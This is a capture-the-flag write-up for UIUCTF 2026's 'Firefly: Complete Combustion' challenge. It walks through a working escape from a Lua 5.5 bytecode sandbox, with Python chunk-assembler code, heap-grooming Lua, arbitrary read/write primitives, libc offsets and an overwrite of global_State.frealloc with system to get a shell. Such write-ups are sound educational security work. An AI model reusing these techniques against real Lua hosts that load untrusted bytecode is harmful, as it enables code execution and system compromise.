@@ -1,0 +1,338 @@
+---
+title: 'UIUCTF 2026 - Firefly: Complete Combustion'
+description: 'Escaping a Lua 5.5 bytecode sandbox by writing registers past the end of the stack, hijacking a table array pointer, and swapping global_State.frealloc for system'
+date: 2026-08-09
+tags: ['writeup', 'pwn', 'lua', 'bytecode', 'heap-exploitation', 'uiuctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+> Elio's script never accounted for untrusted bytecode.
+>
+> Firefly's Complete Combustion simulator accepts one length-prefixed
+> **Lua 5.5.0 binary combat script** on each connection. The usual escape
+> hatches are gone, but the bytecode loader still trusts you completely.
+>
+> `ncat --ssl firefly-complete-combustion.chal.uiuc.tf 1337`
+
+The handout ships the binary, the loader and libc it runs against, an `nsjail.cfg`,
+a `luac` 5.5.0, and the full `main.c`.
+
+## Source Code Analysis
+
+The host is about a hundred lines. It reads a big-endian length, reads that many
+bytes, insists they start with the Lua signature, and loads them in **binary
+mode**:
+
+```c
+status = luaL_loadbufferx(L, (const char *)chunk, chunk_length,
+                          "@complete-combustion", "b");
+```
+
+The sandbox is the standard one:
+
+```c
+static const Library libraries[] = {
+    {LUA_GNAME, luaopen_base},     {LUA_COLIBNAME, luaopen_coroutine},
+    {LUA_TABLIBNAME, luaopen_table}, {LUA_STRLIBNAME, luaopen_string},
+    {LUA_MATHLIBNAME, luaopen_math}, {LUA_UTF8LIBNAME, luaopen_utf8},
+    {NULL, NULL},
+};
+...
+remove_global(L, "dofile");
+remove_global(L, "load");
+remove_global(L, "loadfile");
+```
+
+No `io`, no `os`, and no `load` to build more chunks at run time. Everything has
+to happen inside the one chunk that gets loaded.
+
+Lua has had no bytecode verifier since 5.2 — `lundump.c` checks the header sizes
+and the constant tags and nothing else. `maxstacksize`, register operands,
+constant indices and upvalue counts are all taken on trust. That is the bug; the
+work is turning it into a shell with no file or process primitives in reach.
+
+## Building A Chunk Assembler
+
+Hand-writing 5.5 bytecode is miserable, so the first job was a parser and
+serializer that round-trips `luac` output byte-for-byte, plus a way to splice raw
+instructions into otherwise normal Lua.
+
+The 5.5 dump format is straightforward — varints, a `loadAlign` before the code
+vector, then constants, upvalues, nested protos, source, debug — with one trap.
+`ldump.c` emits **string back-references**: a size of zero followed by an index
+into the table of strings already dumped. A serializer that re-emits the literal
+instead loses the reference and the loader dies with an error that points nowhere
+near the real problem:
+
+```text
+ignition loading failed: complete-combustion: bad binary format (bad format for constant string)
+```
+
+So strings round-trip as either bytes or an integer index:
+
+```python
+def string(self, s):
+    if s is None:
+        self.varint(0); self.varint(0); return
+    if isinstance(s, int):          # back-reference to an earlier string
+        self.varint(0); self.varint(s); return
+    self.varint(len(s) + 1)
+    self.b += s + b'\0'
+```
+
+For injecting raw instructions, the exploit is written as ordinary Lua with
+marker calls, and each marker is a `GETTABUP` + `CALL` pair that gets overwritten
+with the instruction I actually want (padded with a self-`MOVE`, which is a
+harmless no-op):
+
+```python
+def find_marker(proto, name):
+    """locate  GETTABUP A 0 k("__mN") ; CALL A 1 1  -> index of GETTABUP"""
+    ...
+
+def splice(proto, name, insns):
+    i = find_marker(proto, name)
+    insns = list(insns) + [iABC('MOVE', 0, 0)] * (2 - len(insns))
+    proto.code[i:i + 2] = insns
+```
+
+Compiling a debug build of Lua 5.5.0 plus the challenge's `main.c` gives a target
+with symbols to develop against, and the shipped binary can be run through the
+shipped loader for the final calibration:
+
+```bash
+./ld-linux-x86-64.so.2 --library-path . ./firefly
+```
+
+## The Primitive: Registers Past The End Of The Stack
+
+`luaD_precall` grows the Lua stack to `maxstacksize` slots and nothing checks
+register operands against it afterwards. Declare a small `maxstacksize`, emit an
+`OP_MOVE` whose `A` field is far larger, and the VM writes a 16-byte `TValue`
+straight past the end of the stack allocation:
+
+```python
+splice(p, '__m%d' % i, [iABC('MOVE', treg + 1, fr)])
+```
+
+That is a controlled heap write, but only where the heap happens to be. The
+interesting target is the first table created at run time, because of how Lua 5.5
+lays out a table's array part. Since 5.5, values and tags live in one block with
+`array` pointing into the middle of it:
+
+```c
+#define getArrTag(t,k)	(cast(lu_byte*, (t)->array) + sizeof(unsigned) + (k))
+#define getArrVal(t,k)	((t)->array - 1 - (k))
+```
+
+Values grow *down* from `array`, tags grow *up*. So a table whose `array` field I
+control gives `t[1]` as an arbitrary 8-byte read/write at `array - 8`, with one
+collateral tag byte written at `array + 4`. `Table.array` sits at offset 16, which
+is 16-byte aligned — exactly reachable by a `TValue`-granular write.
+
+## Making The Victim Land Where I Can Reach It
+
+Register operands are 8 bits, so the write can only reach 255 slots (4 KB) past
+the frame base. Whether the victim table lands in that window is a heap-layout
+question, and the first attempt failed:
+
+```text
+t_reg=-1385   # the table is 22 KB *below* the stack
+```
+
+The stack is reallocated in place at the top of the heap, and the table is then
+served from a free chunk left behind by the chunk loader, well below it. Bumping
+`maxstacksize` does not help — the stack keeps growing in place, so the distance
+never changes:
+
+```text
+M=60  t_reg=-1385     M=180 t_reg=-1385     M=247 t_reg=-1385
+```
+
+The fix is to exhaust the small free chunks first. A short loop of throwaway
+tables eats the free list, after which allocations come off the top of the heap —
+above the stack, and close to it:
+
+```lua
+local junk = {}
+for i = 1, NJUNK do junk[i] = {} end
+local t = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}
+local s = string.rep("Q", 200)
+```
+
+```text
+N=5   t_reg=-1359  s_reg=-1350
+N=10  t_reg=-1339  s_reg=96
+N=20  t_reg=131    s_reg=140   sdelta=144
+N=30  t_reg=171    s_reg=180   sdelta=144
+```
+
+Twenty is enough: the table sits at register 131 and the long string a fixed 144
+bytes above it, so knowing one address gives the other.
+
+## Arbitrary Read
+
+`tostring` on any collectable value prints its address, which is a free heap
+leak — no corruption needed:
+
+```lua
+local function addrof(o) return tonum(match(tostr(o), "0x(%x+)"), 16) end
+```
+
+With the table's address known and the write primitive live, the next step is a
+long string whose contents pointer I control. A 5.5 `TString` keeps its length at
+offset 16 and a `contents` pointer at offset 24, so two writes turn `string.sub`
+into an arbitrary read:
+
+```lua
+f = tofloat(saddr + 24)
+__m1()
+t[1] = tofloat(0x1000)        -- s.lnglen = 0x1000
+f = tofloat(saddr + 32)
+__m2()
+t[1] = tofloat(taddr)         -- s.contents = wherever I want
+```
+
+Order matters. The write only stores 8 bytes of value plus a one-byte tag, and
+the tag from the length write lands at `saddr + 28` — inside `contents`. Doing
+length first means the second write repairs it; doing it the other way round
+leaves the pointer corrupted by one byte.
+
+The first time this fired was the moment the whole thing became real:
+
+```text
+LEN	4096
+```
+
+## Leaking The Three Addresses
+
+`print` in this build is a *light C function*, so its "address" is the raw
+function pointer, and the offset of the print handler in the shipped binary comes
+straight out of the relocations:
+
+```text
+reloc pointing at "print" string: 0x3b6b0
+  name ptr at 0x3b6b0 -> func reloc [('0x3b6b8', '25ad0')]
+```
+
+That gives the PIE base for free. libc then comes from reading the binary's own
+GOT — `malloc` at RVA `0x3c128`, resolved long before my code runs — and the
+`global_State` comes from a coroutine, whose `lua_State` carries `l_G` at offset
+24:
+
+```lua
+A = (up("<j", sub(s, 1, 8)))            -- global_State*, read from co + 24
+B = addrof(print) - 0x25ad0             -- firefly base
+C = (up("<j", sub(s, 1, 8))) - 0xad750  -- libc base, from the malloc GOT slot
+```
+
+```text
+G	5555805e1780	bin	750b17355000	libc	750b17000000
+```
+
+Both module bases come out page-aligned, which is the cheap check that the reads
+are landing where they should.
+
+## Code Execution Without A ROP Chain
+
+glibc 2.39 has no allocator hooks left, and building a ROP chain would mean
+leaking a stack address too. Lua offers something much shorter: every allocation
+goes through a function pointer that lives in a structure I can now write to.
+
+```c
+typedef struct global_State {
+  lua_Alloc frealloc;  /* function to reallocate memory */
+  void *ud;            /* auxiliary data to 'frealloc' */
+  ...
+```
+
+`luaM_realloc_` calls `(*g->frealloc)(g->ud, block, osize, nsize)`, so `ud` is the
+first argument. Point `frealloc` at `system` and `ud` at libc's `"/bin/sh"`, then
+allocate anything.
+
+The one catch is that `string.pack`/`string.unpack` allocate, so computing the
+second value *after* setting `frealloc` would call `system` with a half-written
+argument. Everything gets precomputed:
+
+```lua
+local w1 = tofloat(A + 8)
+local w2 = tofloat(A + 16)
+local vsys = tofloat(C + 0x58750)
+local vsh  = tofloat(C + 0x1cb42f)
+
+f = w1
+__m4()
+t[1] = vsys          -- global_State.frealloc = system
+f = w2
+__m5()
+t[1] = vsh           -- global_State.ud = "/bin/sh"
+
+D = {}               -- any allocation now calls system("/bin/sh")
+```
+
+## Calibration
+
+Exactly one constant depends on the heap layout: the out-of-bounds register
+index. Conveniently, changing it only rewrites an instruction that is already
+there, so the chunk length — and therefore every allocation the loader makes —
+is byte-for-byte identical across candidates. That makes brute force safe and
+exact, with "did the string's length change" as the oracle:
+
+```python
+for treg in range(lo, hi):
+    d = build_chunk(BODY, treg, 24, name='scan2')
+    open(p, 'wb').write(d)
+    r = subprocess.run(runner, stdin=open(p, 'rb'), capture_output=True, timeout=10)
+    o = r.stdout.decode('latin1')
+    if 'LEN' in o:
+        n = o.split('LEN')[1].split('\n')[0].strip()
+        if n not in ('200', ''):
+            print('treg=%d LEN=%s' % (treg, n))
+```
+
+```text
+treg=131 LEN=4096
+   ... | LEN 4096 | G 5555805e1780  bin 750b17355000  libc 750b17000000
+treg=140 LEN=93825433809496
+   ... | LEN 93825433809496 | G 55556f  bin 72e8a074e000  libc 4a7e1f
+```
+
+131 on both the local rebuild and the shipped binary.
+
+## Exploitation
+
+Locally, against the real binary through the shipped loader, with shell commands
+appended after the chunk:
+
+```bash
+(cat xpl.bin; sleep 0.3; echo 'echo PWNED; id; cat flag.txt') \
+  | ./ld-linux-x86-64.so.2 --library-path . ./firefly
+```
+
+```text
+LEN	4096
+G	55557540c780	bin	706b9036b000	libc	706b90000000
+PWNED
+uid=1000(kuda) gid=1000(kuda) ...
+uiuctf{test}
+```
+
+Remotely it is the same chunk with the kCTF proof of work in front:
+
+```text
+chunk 1055 bytes, treg 131
+pow solved in 6s
+LEN	4096
+G	5555805e1780	bin	750b17355000	libc	750b17000000
+-r--r--r--   1 nobody nogroup   36 Aug  6 04:45 flag.txt
+uiuctf{1_sh4ll_s3t_th3_s34s_4bl4z3}
+```
+
+## Flag
+
+```text
+uiuctf{1_sh4ll_s3t_th3_s34s_4bl4z3}
+```
